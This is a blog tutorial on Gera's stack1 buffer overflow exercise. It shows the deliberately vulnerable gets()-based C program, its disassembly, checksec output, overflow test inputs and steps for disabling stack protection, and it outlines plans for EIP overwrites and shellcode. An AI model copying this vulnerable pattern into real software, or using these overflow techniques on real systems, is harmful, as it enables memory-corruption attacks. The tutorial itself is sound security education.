<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <meta name="author" content="7h3rAm"/>
    <meta name="description" content="Personal Weblog"/>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <title>Grey Matter</title>
    <link href="/static/css/main.css" rel="stylesheet" type="text/css">
    <link href="/static/css/codehilite/zenburn.css" rel="stylesheet" type="text/css">
    <link href="/static/images/favicon-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
  </head>
  <body>
    <section id="content" class="body">
              <div class="header">
          <table>
            <tr>
              <td class="blogtitle"><a href="/">Grey Matter</a></td>
              <td class="blognavbar">
                <a href="/archive.html">[Archive]</a> <a href="/tags.html">[Tags]</a> <a href="/research.html">[Research]</a></a>
              </td>
            </tr>
          </table>
        </div>
                  <article class="post">
  <div class="row">
    <div class="col-lg-12">
      <div class="panel panel-default section compact">
        <div class="body">
          <p class="heading">Gera's Warming Up on Stack #1 - Solutions</p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <p class="date">
                  <a href="/2012/exploit-mitigation-techniques-on-linux.html">&lt&lt;</a> published on 2012 Aug 27<a href="/2012/word-list-builder-dic-file-parsing-seh.html"> &gt;&gt;</i></a><br/>
                </p>
                                                                  <div class="post-content">
          <p>This is the part 1 in a series of posts that aim to provide an
analysis and possible solutions for the vulnerable programs provided by
Gera at his Insecure Programming by example page.</p>

<p>Familiarity with exploit mitigation techniques is expected to gain a
proper understanding of the concepts we talk about here. If terms like
<code>ASLR</code>, <code>NX</code>, <code>SSP</code>, <code>RELRO</code>, etc. seem unfamiliar, I would suggest
reading the <a href="/2012/exploit-mitigation-techniques-on-linux.html">Exploit Mitigation Techniques on Linux
Systems</a> post that
talks about these.</p>

<p>We will start with a scenario in which most of the exploit mitigation
techniques will be enabled through the default GCC compilation
command-line. Since, these techniques prevent successful exploit
attempts, we will incrementally turn them off until successful
exploitation is achieved. This setup will allow us to witness how these
individual techniques succeed in restricting exploit attempts and how
their absence affects exploitation reliability.</p>

<p>Below is the source for the vulnerable
<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>
program:</p>

<div class="codehilite"><pre><span></span><code><span class="cm">/* stack1.c                                     *</span>
<span class="cm"> * specially crafted to feed your brain by gera */</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">cookie</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %08x cookie: %08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="err">`</span><span class="mh">0x41424344</span><span class="err">`</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you win!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>The above program accepts user-input through the <code>gets</code> function and
then looks for a specific value in a local variable named <code>cookie</code>. If
this value is equal to a certain pre-defined constant, printf function
is used to show a <code>you win!</code> message to the user. There is no direct
means of modifying the content of the cookie variable. The <code>gets</code>
function will keep reading from the stdin device until it encounters a
newline or EoF character. Since this reading loop fails to honor the
size of the destination buffer, a classic buffer overflow vulnerability
is introduced in the program. Our aim is to leverage this vulnerability
and exploit this program so that it print the <code>you win!</code> message to
stdout.</p>

<p>Here are a few observations that could be made by looking at the source
of the program:</p>

<ol>
<li>Since it is defined prior to buf, the cookie would be placed at a higher memory address on the program stack, just below the saved registers from the function prologue</li>
<li>The <code>buf</code> character array would be at an offset of at least 80B from <code>cookie</code></li>
<li>The <code>gets</code> call would accept unbounded user-input within <code>buf</code> array and hence it provides a mechanism to alter the call stack contents.</li>
</ol>

<p>To attempt exploitation, proper understanding of a program&#8217;s memory
layout and the positioning of its metadata is very important. We first
need to understand the <a href="http://www.csee.umbc.edu/%7Echang/cs313.s02/stack.shtml">call stack</a> for the <code>stack1</code> program.</p>

<p>Whenever a function is called, based upon the <a href="https://en.wikipedia.org/wiki/X86_calling_conventions">calling convention</a> in use,
metadata information will be pushed on to stack. Upon function
termination this information is popped out of stack. The order in which
variables are pushed and popped is of importance here. On Linux/GCC
environments which use the <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl">cdecl</a> calling convention, the caller first
pushes any function arguments from right to left in to its stack frame.
Then the return address is pushed and finally the control is transferred
to callee&#8217;s <code>.text</code> segment. The callee, when initiated, will execute
the <a href="https://en.wikipedia.org/wiki/Function_prologue">function prologue</a> to set up its stack frame. As a part of prologue,
the EBP value is pushed on to the stack. Since this is the first
operation on the stack after the return address push operation, the EIP
and saved EBP end up at adjacent locations. These two values mark
boundary for the caller&#8217;s and callee&#8217;s stack frames. The location of EIP
marks the top of caller&#8217;s stack frame and the location of saved EBP
marks the base of callee&#8217;s stack frame.</p>

<p>Refer the below stack layouts for better understanding. The first layout
outlines the call stack for the caller&#8217;s <code>main</code> function:</p>

<p><img src="/static/files/caller-main.png" alt="caller-main.png" /></p>

<p>The second layout outlines the call stack for the callee&#8217;s <code>add</code>
function:</p>

<p><img src="/static/files/callee-add.png" alt="image" /></p>

<p>While control is in the callee function, the passed arguments are
accessed by using EBP as a pointer. According to the calling convention,
the first parameter is located at an offset of EBP+8, the second
parameter is located at an offset of EBP+12, and so on. Using this
formula we can locate function arguments (EBP+8 in the above layout is
32+8 = 40 which stores the first argument 3 and similarly EBP+12 is
32+12 = 44 which stores the second argument 6). Since the above
described call stack layout will be used for all programs, we could
generalize the above formula and use it to find the offset of EBP itself
and then the offset of EIP (EBP+4). The address of EBP is located by
summing up the address of the first local variable on the stack with its
size. Similarly EIP could be located by adding 4 to the address of the
EBP.</p>

<p>Based on these observations, let&#8217;s try to visualize the call stack
layout for the <code>stack1</code> program:</p>

<p><img src="/static/files/stack1-callstack-raw.png" alt="image" /></p>

<p>NOTE: The stack is assumed to be 4B aligned and we are working on an x86
machine. The addresses in the layouts are for reference only.While
thinking about possible solutions for this program, I came up with the
below listed ideas:</p>

<ul>
<li>Solution #1: Overflow the 4B past <code>buf</code>, where the <code>cookie</code> is stored, with the desired value (<code>0x41424344</code> in this case)</li>
<li>Solution #2: Overwrite EIP with the address of the <code>printf</code> statement that prints the <code>you win!</code> message</li>
<li>Solution #3: Inject and execute a shellcode that simulates the second <code>printf</code> statement, through the internal <code>buf</code> character array</li>
<li>Solution #4: Inject and execute a shellcode, that simulates the second <code>printf</code> statement, through an environment variable and overwrite EIP with its address</li>
</ul>

<p>All right! Let&#8217;s start with the test execution of this program. Here&#8217;s a
brief description of the test system:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># cat /etc/lsb-release | grep DESC</span>
<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span><span class="s2">&quot;Ubuntu 9.04&quot;</span>
<span class="c1">#</span>
<span class="c1"># uname -a | cut -d&quot; &quot; -f1,3,12,13</span>
Linux <span class="m">2</span>.6.28-19-generic i686 GNU/Linux
<span class="c1">#</span>
<span class="c1"># gcc --version | grep gcc</span>
gcc <span class="o">(</span>Ubuntu <span class="m">4</span>.3.3-5ubuntu4<span class="o">)</span> <span class="m">4</span>.3.3
<span class="c1">#</span>
<span class="c1"># cat /proc/cpuinfo | grep -E &#39;(vendor|model|flags)&#39;</span>
vendor_id : GenuineIntel
model   : <span class="m">60</span>
model name  : Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-4200M CPU @ <span class="m">2</span>.50GHz
flags   : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx rdtscp lm constant_tsc up xtopology pni pclmulqdq monitor ssse3 cx16 sse4_1 sse4_2 aes xsave avx lahf_lm abm
</code></pre></div>

<p>Below is the GCC command-line to compile the <code>stack1.c</code> source file. The
<code>-mpreferred-stack-boundary=2</code> option is used to align stack entries at
QWORD (8B) boundary:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># gcc -mpreferred-stack-boundary=2 -o stack1 stack1.c</span>
stack1.c: In <span class="k">function</span> ‘main’:
stack1.c:8: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span><span class="m">80</span><span class="o">]</span>’
stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">3</span> has <span class="nb">type</span> ‘int *’
/tmp/ccaqTuRT.o: In <span class="k">function</span> <span class="sb">`</span>main<span class="s1">&#39;:</span>
<span class="s1">stack1.c:(.text+`0x32`): warning: the `gets&#39;</span> <span class="k">function</span> is dangerous and should not be used.
</code></pre></div>

<p>GCC outlines a few warnings with the above code, out of which, the last
one suggests to find an alternative for the gets, since it is a
<em>dangerous</em> function. We are in the process of figuring out just how
dangerous <code>gets</code> can be and hence we can ignore this and earlier
warnings.</p>

<p>Lets have a peak into the assembly code of the stack1 ELF binary. Below
command-line uses the objdump utility to dump the disassembled object
code of a program in <a href="http://asm.sourceforge.net/articles/linasm.html#Syntax">Intel</a> syntax (remove the <code>-Mintel</code> option from the
below command-line to view AT&amp;T syntax formatted assembled code):</p>

<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A30</span> <span class="nv">main.</span><span class="p">:</span>
<span class="err">08048484</span> <span class="err">&lt;</span><span class="nf">main</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">8048484:</span> <span class="err">55</span>                    <span class="nf">push</span>   <span class="nb">ebp</span>
 <span class="err">8048485:</span> <span class="err">89</span> <span class="nf">e5</span>                 <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
 <span class="err">8048487:</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">68</span>              <span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x68</span>
 <span class="err">804848</span><span class="nl">a:</span> <span class="err">65</span> <span class="nf">a1</span> <span class="mi">14</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>     <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">gs</span><span class="p">:</span><span class="mh">0x14</span>
 <span class="err">8048490:</span> <span class="err">89</span> <span class="err">45</span> <span class="nf">fc</span>              <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">8048493:</span> <span class="err">31</span> <span class="nf">c0</span>                 <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
 <span class="err">8048495:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">a8</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x58</span><span class="p">]</span>
 <span class="err">8048498:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">08</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">804849</span><span class="nl">c:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
 <span class="err">804849</span><span class="nl">f:</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">04</span>           <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">80484</span><span class="nl">a3:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="nv">b0</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x80485b0</span>
 <span class="err">80484</span><span class="nl">aa:</span> <span class="nf">e8</span> <span class="nv">e9</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">8048398</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
 <span class="err">80484</span><span class="nl">af:</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">45</span> <span class="nv">ac</span>              <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x54</span><span class="p">]</span>
 <span class="err">80484</span><span class="nl">b2:</span> <span class="err">89</span> <span class="err">04</span> <span class="err">24</span>              <span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
 <span class="err">80484</span><span class="nl">b5:</span> <span class="nf">e8</span> <span class="nv">be</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">8048378</span> <span class="o">&lt;</span><span class="nv">gets@plt</span><span class="o">&gt;</span>
 <span class="err">80484</span><span class="nl">ba:</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="nv">a8</span>              <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x58</span><span class="p">]</span>
 <span class="err">80484</span><span class="nl">bd:</span> <span class="err">3</span><span class="nf">d</span> <span class="mi">44</span> <span class="mi">43</span> <span class="mi">42</span> <span class="mi">41</span>        <span class="nv">cmp</span>    <span class="nb">eax</span><span class="p">,</span><span class="s">`0x41424344`</span>
 <span class="err">80484</span><span class="nl">c2:</span> <span class="err">75</span> <span class="err">0</span><span class="nf">c</span>                 <span class="nv">jne</span>    <span class="mi">80484</span><span class="nv">d0</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mh">0x4c</span><span class="o">&gt;</span>
 <span class="err">80484</span><span class="nl">c4:</span> <span class="nf">c7</span> <span class="mi">04</span> <span class="mi">24</span> <span class="nv">c8</span> <span class="mi">85</span> <span class="mi">04</span> <span class="mi">08</span>  <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="mh">0x80485c8</span>
 <span class="err">80484</span><span class="nl">cb:</span> <span class="nf">e8</span> <span class="nv">e8</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">80483</span><span class="nv">b8</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
 <span class="err">80484</span><span class="nl">d0:</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">55</span> <span class="nv">fc</span>              <span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
 <span class="err">80484</span><span class="nl">d3:</span> <span class="err">65</span> <span class="err">33</span> <span class="err">15</span> <span class="err">14</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="nf">xor</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="nb">gs</span><span class="p">:</span><span class="mh">0x14</span>
 <span class="err">80484</span><span class="nl">da:</span> <span class="err">74</span> <span class="err">05</span>                 <span class="nf">je</span>     <span class="mi">80484</span><span class="nv">e1</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mh">0x5d</span><span class="o">&gt;</span>
 <span class="err">80484</span><span class="nl">dc:</span> <span class="nf">e8</span> <span class="nv">c7</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>        <span class="nv">call</span>   <span class="mi">80483</span><span class="nv">a8</span> <span class="o">&lt;</span><span class="nv">__stack_chk_fail@plt</span><span class="o">&gt;</span>
 <span class="err">80484</span><span class="nl">e1:</span> <span class="nf">c9</span>                    <span class="nv">leave</span>
 <span class="err">80484</span><span class="nl">e2:</span> <span class="nf">c3</span>                    <span class="nv">ret</span>
 <span class="err">80484</span><span class="nl">e3:</span> <span class="err">90</span>                    <span class="nf">nop</span>
 <span class="err">80484</span><span class="nl">e4:</span> <span class="err">90</span>                    <span class="nf">nop</span>
 <span class="err">80484</span><span class="nl">e5:</span> <span class="err">90</span>                    <span class="nf">nop</span>
 <span class="err">80484</span><span class="nl">e6:</span> <span class="err">90</span>                    <span class="nf">nop</span>
</code></pre></div>

<p>There are a few very important points to note from the above output:</p>

<ol>
<li>To witness the <a href="http://en.wikipedia.org/wiki/Buffer_overflow_protection#GCC_Stack-Smashing_Protector_.28ProPolice.29">SSP</a> mitigation technique, locate the <code>mov eax, gs:0x14</code> instruction at memory address <code>0x080484aa</code>. This instruction inserts a random 4B canary value just below the function prologue.</li>
<li>Variable reordering feature of SSP is also in place since for the initial <code>printf</code> call, the first variable to be pushed on to stack is <code>&amp;cookie</code> instead of <code>&amp;buf</code> (refer <a href="http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl">cdecl</a> calling convention). This is concluded from the addresses used to move arguments onto stack. The <code>&amp;cookie</code> is accessed from the location <code>[ebp-0x58]</code> and <code>&amp;buf</code> from <code>[ebp-0x54]</code>. As such, cookie is placed at a distance of 88B from EBP and <code>buf</code> is located right above it at a distance of 84B from EBP. The additional 4B are from the canary placed inbetween <code>buf</code> and EBP.</li>
<li>The code to verify the content of canary, before returning control to the parent process, is also added and can be found at address <code>0x080484f0</code>. If this check fails, the <code>__stack_chk_fail</code> function is called to abort the execution of this program.</li>
</ol>

<p><strong>NOTE</strong>: These SSP features are enabled by default and hence were
introduced automatically through the vanilla command-line we used to
compile <code>stack1.c</code> above. It is, however, suggested to use explicit
command-line arguments without considering their default status when
compiling your source files. This ensures portability of security checks
in your applications.</p>

<p>You must have already guessed that the call stack layout we saw earlier
is no longer in sync with the compiled binary. We need to recreate it
considering the above discussed modifications:</p>

<p><img src="/static/files/stack1-callstack.png" alt="stack1-callstack.png" /></p>

<p>The default GCC command-line might have turned on other mitigation
features as well. We need to investigate further before proceeding.
<a href="http://www.trapkit.de/about.html">Tobias Klein</a>, the author of <a href="http://www.trapkit.de/books/bhd/en.html">A Bug
Hunter&#8217;s Diary</a>, maintains an
awesome Bash script called
<a href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a> that provides
an overview of the security features implemented within the Linux
kernel, ELF binaries and executing processes on a system. Here is a
listing of its available options:</p>

<div class="codehilite"><pre><span></span><code>$ ./checksec.sh
Usage: checksec <span class="o">[</span>OPTION<span class="o">]</span>

Options:

  --file &lt;executable-file&gt;
  --dir &lt;directory&gt; <span class="o">[</span>-v<span class="o">]</span>
  --proc &lt;process name&gt;
  --proc-all
  --proc-libs &lt;process ID&gt;
  --kernel
  --fortify-file &lt;executable-file&gt;
  --fortify-proc &lt;process ID&gt;
  --version
  --help

For more information, see:
  http://www.trapkit.de/tools/checksec.html
</code></pre></div>

<p>Obtain the latest version of this script (1.5 as of this writing). Let&#8217;s
try the <code>--kernel</code> option to see available mitigation features
implemented within the kernel on the test system:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># ./checksec.sh --kernel</span>
* Kernel protection information:

  Description - List the status of kernel protection mechanisms. Rather than
  inspect kernel mechanisms that may aid in the prevention of exploitation of
  userspace processes, this option lists the status of kernel configuration
  options that harden the kernel itself against attack.

  Kernel config: /boot/config-2.6.28-19-generic

  Warning: The config on disk may not represent running kernel config!

  GCC stack protector support:            Disabled
  Strict user copy checks:                Disabled
  Enforce read-only kernel data:          Enabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled

* grsecurity / PaX: No GRKERNSEC

  The grsecurity / PaX patchset is available here:
    http://grsecurity.net/

* Kernel Heap Hardening: No KERNHEAP

  The KERNHEAP hardening patchset is available here:
    https://www.subreption.com/kernheap/
</code></pre></div>

<p>The output above confirms that the GCC stack protector support is
enabled and we have already seen it in action earlier. Let&#8217;s now see
what does this script has to say about the <code>stack1</code> ELF binary:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># ./checksec.sh --file stack1</span>
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   stack1
<span class="c1"># ./checksec.sh --fortify-file stack1</span>
* FORTIFY_SOURCE support available <span class="o">(</span>libc<span class="o">)</span>    : Yes
* Binary compiled with FORTIFY_SOURCE support: Yes

 ------ EXECUTABLE-FILE ------- . -------- LIBC --------
 FORTIFY-able library functions <span class="p">|</span> Checked <span class="k">function</span> names
 -------------------------------------------------------
 <span class="nb">printf</span>                         <span class="p">|</span> __printf_chk
 <span class="nb">printf</span>                         <span class="p">|</span> __printf_chk
 gets                           <span class="p">|</span> __gets_chk
 gets                           <span class="p">|</span> __gets_chk

SUMMARY:

* Number of checked functions in libc                : <span class="m">74</span>
* Total number of library functions in the executable: <span class="m">53</span>
* Number of FORTIFY-able functions in the executable : <span class="m">4</span>
* Number of checked functions in the executable      : <span class="m">0</span>
* Number of unchecked functions in the executable    : <span class="m">4</span>
</code></pre></div>

<p>As discussed earlier, the default compilation command-line enabled quite
a few mitigation features like <code>Partial RELRO</code>, <code>stack canary</code>, <code>NX</code> and
a few others. These features have made significant modifications to the
vulnerable program and their presence will prohibit its successful
exploitation. From the above output, also note that the <code>printf</code> and
<code>gets</code> functions have not been replaced with their safer counterparts.
This should have happened through the default command-line. But since
the program source did not include the necessary standard libraries for
these functions, the <code>FORTIFY_SOURCE</code> mitigation feature failed to
detect their presence and as such could not replace them. If you
recompile the source with the necessary libraries included, you will
encounter the <em>stack smashing detected</em> error message. Even in the
absence of this feature, the ELF binary is quite difficult to exploit.
We need to print the <code>you win!</code> message to successfully exploit this
program. But since the <code>cookie</code> has been reordered and placed below
<code>buf</code>, we simply have no way to modify it. Additionally, any attempts to
overwrite the return address would fail since the canary is placed in
between. While overwriting EIP, it will also be overwritten and the
<code>__stack_chk_fail</code> function would terminate the program before the
message is printed:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># perl -e &#39;print &quot;A&quot;x81&#39; | ./stack1</span>
buf: bfb94544 cookie: bfb94540
*** stack smashing detected ***: ./stack1 <span class="nv">terminated</span>
<span class="o">=======</span> Backtrace: <span class="o">=========</span>
/lib/tls/i686/cmov/libc.so.6<span class="o">(</span>__fortify_fail+<span class="sb">`</span>0x48<span class="o">)[</span>0xb7<span class="sb">`</span>7a2ef8<span class="o">]</span>
/lib/tls/i686/cmov/libc.so.6<span class="o">(</span>__fortify_fail+<span class="sb">`</span>0x0<span class="o">)[</span>0xb77<span class="sb">`</span>a2eb0<span class="o">]</span>
./stack1<span class="o">[</span><span class="sb">`</span>0x80484e1<span class="o">]</span><span class="sb">`</span>
/lib/tls/i686/cmov/libc.so.6<span class="o">(</span>__libc_start_main+<span class="sb">`</span>0xe5<span class="o">)[</span>0xb7<span class="sb">`</span>6bb775<span class="o">]</span>
./stack1<span class="o">[</span><span class="sb">`</span>0x80483f1<span class="o">]</span><span class="sb">`</span>
<span class="o">=======</span> Memory map: <span class="o">========</span>
<span class="m">08048000</span>-08049000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">9352</span>       /home/seed/Documents/stack1
<span class="m">08049000</span>-0804a000 r--p <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">9352</span>       /home/seed/Documents/stack1
0804a000-0804b000 rw-p <span class="m">00001000</span> <span class="m">08</span>:01 <span class="m">9352</span>       /home/seed/Documents/stack1
<span class="m">09724000</span>-09745000 rw-p <span class="m">09724000</span> <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>heap<span class="o">]</span>
b7687000-b7694000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
b7694000-b7695000 r--p 0000c000 <span class="m">08</span>:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
b7695000-b7696000 rw-p 0000d000 <span class="m">08</span>:01 <span class="m">278049</span>     /lib/libgcc_s.so.1
b76a4000-b76a5000 rw-p b76a4000 <span class="m">00</span>:00 <span class="m">0</span>
b76a5000-b7801000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
b7801000-b7802000 ---p 0015c000 <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
b7802000-b7804000 r--p 0015c000 <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
b7804000-b7805000 rw-p 0015e000 <span class="m">08</span>:01 <span class="m">294460</span>     /lib/tls/i686/cmov/libc-2.9.so
b7805000-b7808000 rw-p b7805000 <span class="m">00</span>:00 <span class="m">0</span>
b7814000-b7818000 rw-p b7814000 <span class="m">00</span>:00 <span class="m">0</span>
b7818000-b7819000 r-xp b7818000 <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>vdso<span class="o">]</span>
b7819000-b7835000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">280519</span>     /lib/ld-2.9.so
b7835000-b7836000 r--p 0001b000 <span class="m">08</span>:01 <span class="m">280519</span>     /lib/ld-2.9.so
b7836000-b7837000 rw-p 0001c000 <span class="m">08</span>:01 <span class="m">280519</span>     /lib/ld-2.9.so
bfb81000-bfb96000 rw-p bffea000 <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>stack<span class="o">]</span>
Aborted
</code></pre></div>

<p>In the above test run, supplying 81B of input causes the program to
crash. Note the addresses of <code>buf</code> and <code>cookie</code>, <code>0xbf857bc4</code> and
<code>0xbf857bc0</code> respectively. Variable reordering is in effect here since
<code>buf</code> is placed at a higher memory address than <code>cookie</code>. We are
experiencing the influence of exploit mitigation techniques at this
stage. For a successful exploit attempt, we will have to disable these
features to be able to achieve exploitation. Let&#8217;s disable the stack
canary mitigation feature first. Below output shows the GCC option
<code>-fno-stack-protector</code>, that disables SSP and as such provides a wide
playground for our exploit attempts. Additionally, we see how the
<code>checksec.sh</code> script correctly identifies the absence of stack canary
and fortify source mitigation features from the program:</p>

<div class="codehilite"><pre><span></span><code><span class="c1"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack1 stack1.c</span>
stack1.c: In <span class="k">function</span> ‘main’:
stack1.c:8: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span><span class="m">80</span><span class="o">]</span>’
stack1.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">3</span> has <span class="nb">type</span> ‘int *’
/tmp/ccOI8wdo.o: In <span class="k">function</span> <span class="sb">`</span>main<span class="s1">&#39;:</span>
<span class="s1">stack1.c:(.text+`0x27): war`ning: the `gets&#39;</span> <span class="k">function</span> is dangerous and should not be used.
<span class="c1">#</span>
<span class="c1"># ./checksec.sh --file stack1</span>
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   stack1
<span class="c1">#</span>
<span class="c1"># perl -e &#39;print &quot;A&quot;x81&#39; | ./stack1</span>
buf: bfbb8bf4 cookie: bfbb8c44
</code></pre></div>

<p>The <code>buf</code> is at <code>0xbfa68294</code> and the cookie at <code>0xbfa682e4</code>. The variables
have been ordered as per our expectation. Let&#8217;s have a peek at the
program assembly to quickly see if the stack cookie has also been added
or not:</p>

<div class="codehilite"><pre><span></span><code><span class="err">#</span> <span class="nf">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="o">-</span><span class="nv">Mintel</span> <span class="nv">stack1</span> <span class="o">|</span> <span class="nv">grep</span> <span class="o">-</span><span class="nv">A20</span> <span class="nv">main.</span><span class="p">:</span>
<span class="err">08048424</span> <span class="err">&lt;</span><span class="nf">main</span><span class="o">&gt;</span><span class="p">:</span>
 <span class="err">8048424:</span> <span class="err">55</span>                    <span class="nf">push</span>   <span class="nb">ebp</span>
 <span class="err">8048425:</span> <span class="err">89</span> <span class="nf">e5</span>                 <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
